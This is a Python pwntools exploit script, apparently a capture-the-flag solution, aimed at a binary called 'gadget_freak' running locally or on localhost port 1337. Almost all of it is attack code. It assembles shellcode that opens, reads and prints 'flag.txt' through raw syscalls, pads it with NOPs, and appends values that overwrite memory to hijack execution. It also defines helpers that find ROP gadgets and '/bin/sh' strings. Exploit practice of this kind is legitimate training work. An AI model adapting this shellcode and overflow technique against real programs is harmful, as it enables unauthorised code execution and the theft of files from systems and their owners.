from pwn import *
from icecream import ic

elf = exe = ELF("./gadget_freak")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *main+1212
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

sl(b'2')

payload = asm('''
    mov dword ptr [rsp], 0x67616c66
    mov dword ptr [rsp+4], 0x7478742e

    lea rdi, [rsp]
    mov rax, 2
    xor rsi, rsi
    xor rdx, rdx
    syscall

    mov rdi, rax
    lea rsi, [rsp]
    mov rdx, 200
    xor rax, rax
    syscall

    mov rdi, 1
    lea rsi, [rsp]
    mov rdx, rax
    mov rax, 1
    syscall
''')

payload = payload.ljust(128, b'\x90')
payload += p64(7)
# payload += p64(0x20000)
payload += p64(0x300000 + (0xc394 * 4))
sl(payload)


io.interactive()
